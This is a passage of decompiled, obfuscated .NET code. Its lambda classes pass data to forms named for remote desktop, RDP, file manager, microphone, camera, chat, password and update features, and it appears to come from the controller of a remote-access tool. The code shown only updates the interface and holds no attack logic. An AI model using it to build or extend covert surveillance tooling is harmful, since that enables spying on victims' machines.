    [CompilerGenerated]
    [SpecialName]
    public void _Lambda\u0024__80() => this.gclass18_0.method_20().formDesktop_0.method_10();

    [CompilerGenerated]
    [SpecialName]
    public void _Lambda\u0024__81() => this.gclass21_0.method_9(this.gclass18_0);
  }

  internal sealed class Class115
  {
    public GClass18 gclass18_0;
    public object[] object_0;

    [CompilerGenerated]
    [SpecialName]
    public void _Lambda\u0024__116() => this.gclass18_0.method_20().formWindowsRDP_0.method_2(Conversions.ToString(this.object_0[2]));

    [CompilerGenerated]
    [SpecialName]
    public void _Lambda\u0024__117() => this.gclass18_0.method_20().formWindowsRDP_0.method_3(this.object_0);
  }

  internal sealed class Class116
  {
    public GClass18 gclass18_0;
    public FormFileManager formFileManager_0;
    public int int_0;
    public object[] object_0;
    public GClass21 gclass21_0;

    [CompilerGenerated]
    [SpecialName]
    public void _Lambda\u0024__126() => this.gclass21_0.method_49(this.gclass18_0, this.formFileManager_0, (ListView) this.formFileManager_0.vmethod_54(), this.int_0);

    [CompilerGenerated]
    [SpecialName]
    public void _Lambda\u0024__127() => this.formFileManager_0.vmethod_54().Items[this.int_0].SubItems[2].Text = Conversions.ToString(Convert.ToInt32(RuntimeHelpers.GetObjectValue(Conversion.Int(Operators.MultiplyObject(Operators.DivideObject(this.object_0[6], this.object_0[8]), (object) 100))))) + "%";
  }

  internal sealed class Class117
  {
    public GClass18 gclass18_0;

    [CompilerGenerated]
    [SpecialName]
    public void _Lambda\u0024__82()
    {
      this.gclass18_0.method_20().formDesktop_0.vmethod_2().Visible = false;
      this.gclass18_0.method_20().formDesktop_0.vmethod_4().Visible = false;
    }
  }

  internal sealed class Class118
  {
    public ListViewItem listViewItem_0;
    public object[] object_0;
    public GClass21 gclass21_0;

    [CompilerGenerated]
    [SpecialName]
    public void _Lambda\u0024__84()
    {
      this.listViewItem_0.SubItems[4].Text = this.gclass21_0.method_21(Conversions.ToInteger(this.object_0[2]));
      this.listViewItem_0.SubItems[6].Text = Conversions.ToString(this.object_0[1]);
    }
  }

  internal sealed class Class119
  {
    public FormMicrophone formMicrophone_0;
    public object[] object_0;

    [CompilerGenerated]
    [SpecialName]
    public void _Lambda\u0024__122() => this.formMicrophone_0.method_4(this.object_0);
  }

  internal sealed class Class120
  {
    public GClass18 gclass18_0;
    public object[] object_0;

    [CompilerGenerated]
    [SpecialName]
    public void _Lambda\u0024__125() => this.gclass18_0.method_20().formChat_0.method_3(this.object_0);
  }

  internal sealed class Class121
  {
    public GClass18 gclass18_0;
    public object[] object_0;

    [CompilerGenerated]
    [SpecialName]
    public void _Lambda\u0024__118() => this.gclass18_0.method_20().formCamera_0.method_1(this.object_0);
  }

  internal sealed class Class122
  {
    public GClass18 gclass18_0;
    public FormFileManager formFileManager_0;
    public int int_0;
    public GClass21 gclass21_0;

    [CompilerGenerated]
    [SpecialName]
    public void _Lambda\u0024__128() => this.gclass21_0.method_49(this.gclass18_0, this.formFileManager_0, (ListView) this.formFileManager_0.vmethod_54(), this.int_0);

    [CompilerGenerated]
    [SpecialName]
    public void _Lambda\u0024__129() => this.formFileManager_0.vmethod_68().Stop();

    [CompilerGenerated]
    [SpecialName]
    public void _Lambda\u0024__130() => this.gclass21_0.method_49(this.gclass18_0, this.formFileManager_0, (ListView) this.formFileManager_0.vmethod_54(), this.int_0);
  }

  internal sealed class Class123
  {
    public GClass18 gclass18_0;
    public object[] object_0;

    [CompilerGenerated]
    [SpecialName]
    public void _Lambda\u0024__114() => this.gclass18_0.method_20().formDesktop_0.method_15((string) this.object_0[2]);

    [CompilerGenerated]
    [SpecialName]
    public void _Lambda\u0024__115() => this.gclass18_0.method_20().formDesktop_0.method_9();
  }

  internal sealed class Class124
  {
    public GClass18 gclass18_0;

    [CompilerGenerated]
    [SpecialName]
    public void _Lambda\u0024__83()
    {
      GClass41 gclass41 = Class97.formMain_0.vmethod_0().vmethod_108();
      ListViewItem listViewItem4 = this.gclass18_0.method_20().listViewItem_4;
      if (listViewItem4 != null)
      {
        listViewItem4.SubItems[1].Text = Conversions.ToString(this.gclass18_0.method_20().stopwatch_0.ElapsedMilliseconds) + " ms";
        this.gclass18_0.method_20().int_2 = (int) this.gclass18_0.method_20().stopwatch_0.ElapsedMilliseconds;
        gclass41.method_5(listViewItem4.Index, 1, listViewItem4);
      }
    }
  }

  internal sealed class Class125
  {
    public GClass18 gclass18_0;
    public object[] object_0;

    [CompilerGenerated]
    [SpecialName]
    public void _Lambda\u0024__88() => this.gclass18_0.method_20().newFormSystemManagers_0.vmethod_6().method_6(this.object_0);

    [CompilerGenerated]
    [SpecialName]
    public void _Lambda\u0024__89() => this.gclass18_0.method_20().newFormSystemManagers_0.vmethod_6().method_7(this.object_0);

    [CompilerGenerated]
    [SpecialName]
    public void _Lambda\u0024__90() => this.gclass18_0.method_20().newFormSystemManagers_0.vmethod_6().method_8(this.object_0);

    [CompilerGenerated]
    [SpecialName]
    public void _Lambda\u0024__91() => this.gclass18_0.method_20().newFormSystemManagers_0.vmethod_6().method_9(this.object_0);
  }

  internal sealed class Class126
  {
    public GClass18 gclass18_0;
    public string string_0;

    [CompilerGenerated]
    [SpecialName]
    public void _Lambda\u0024__87() => Class97.smethod_20(this.gclass18_0.method_20().newFormSystemManagers_0.vmethod_34(), this.string_0);
  }

  internal sealed class Class127
  {
    public GClass18 gclass18_0;
    public object[] object_0;

    [CompilerGenerated]
    [SpecialName]
    public void _Lambda\u0024__123() => this.gclass18_0.method_20().formPassword_0.method_1(this.gclass18_0, this.object_0);
  }

  internal sealed class Class128
  {
    public GClass18 gclass18_0;
    public object[] object_0;

    [CompilerGenerated]
    [SpecialName]
    public void _Lambda\u0024__101() => this.gclass18_0.method_20().newFormSystemManagers_0.vmethod_20().method_15(this.object_0);

    [CompilerGenerated]
    [SpecialName]
    public void _Lambda\u0024__102() => this.gclass18_0.method_20().newFormSystemManagers_0.vmethod_20().method_16(this.object_0);

    [CompilerGenerated]
    [SpecialName]
    public void _Lambda\u0024__103() => this.gclass18_0.method_20().newFormSystemManagers_0.vmethod_20().method_13(this.object_0);

    [CompilerGenerated]
    [SpecialName]
    public void _Lambda\u0024__104() => this.gclass18_0.method_20().newFormSystemManagers_0.vmethod_20().method_14(this.object_0);
  }

  internal sealed class Class129
  {
    public GClass18 gclass18_0;
    public object[] object_0;

    [CompilerGenerated]
    [SpecialName]
    public void _Lambda\u0024__85() => this.gclass18_0.method_20().newFormSystemManagers_0.method_3(this.object_0);

    [CompilerGenerated]
    [SpecialName]
    public void _Lambda\u0024__86() => this.gclass18_0.method_20().newFormSystemManagers_0.method_4(this.object_0);
  }

  internal sealed class Class130
  {
    public GClass18 gclass18_0;
    public object[] object_0;

    [CompilerGenerated]
    [SpecialName]
    public void _Lambda\u0024__124() => this.gclass18_0.method_20().formExecuteUpdate_0.method_2(this.gclass18_0, this.object_0);
  }

  internal sealed class Class131
  {
    public GClass18 gclass18_0;
    public object[] object_0;

    [CompilerGenerated]
    [SpecialName]
    public void _Lambda\u0024__100() => this.gclass18_0.method_20().newFormSystemManagers_0.vmethod_8().method_17(this.object_0);

    [CompilerGenerated]
    [SpecialName]
    public void _Lambda\u0024__92() => this.gclass18_0.method_20().newFormSystemManagers_0.vmethod_8().method_11(this.object_0);

    [CompilerGenerated]
    [SpecialName]
    public void _Lambda\u0024__93() => this.gclass18_0.method_20().newFormSystemManagers_0.vmethod_8().method_12(this.object_0);

    [CompilerGenerated]
    [SpecialName]
    public void _Lambda\u0024__94() => this.gclass18_0.method_20().newFormSystemManagers_0.vmethod_8().method_13(this.object_0);

    [CompilerGenerated]
    [SpecialName]
    public void _Lambda\u0024__95() => this.gclass18_0.method_20().newFormSystemManagers_0.vmethod_8().method_14(this.object_0);

    [CompilerGenerated]
    [SpecialName]
    public void _Lambda\u0024__96() => this.gclass18_0.method_20().newFormSystemManagers_0.vmethod_8().method_15(this.object_0);

    [CompilerGenerated]
    [SpecialName]
    public void _Lambda\u0024__97() => this.gclass18_0.method_20().newFormSystemManagers_0.vmethod_8().method_16(this.object_0);

    [CompilerGenerated]
    [SpecialName]
    public void _Lambda\u0024__98() => this.gclass18_0.method_20().newFormSystemManagers_0.vmethod_8().method_17(this.object_0);

    [CompilerGenerated]
    [SpecialName]
    public void _Lambda\u0024__99() => this.gclass18_0.method_20().newFormSystemManagers_0.vmethod_8().method_16(this.object_0);
  }
}
